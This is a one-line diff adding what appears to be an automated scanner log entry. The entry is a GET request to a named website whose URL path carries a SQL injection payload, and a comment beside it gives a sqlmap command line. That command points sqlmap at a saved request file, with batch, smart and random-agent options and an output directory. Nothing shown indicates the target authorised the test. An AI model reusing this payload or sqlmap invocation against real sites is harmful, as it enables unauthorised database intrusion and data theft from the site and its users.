@@ -1,0 +1,1 @@
+http://www.fzym.com:80/category/-1'%20OR%2011611=6%20AND%20000625=000625%20or%20'fP6eT1e8'=' (GET)  # "D:\Program Files\Python\Python311\Scripts\sqlmap" -r sqlmap_requests\014_SQL_Injection_s_[_]_3885468190293100424.txt --batch --smart --random-agent --output-dir sqlmap_output\014_3885468190293100424 -p /<s>/[*]
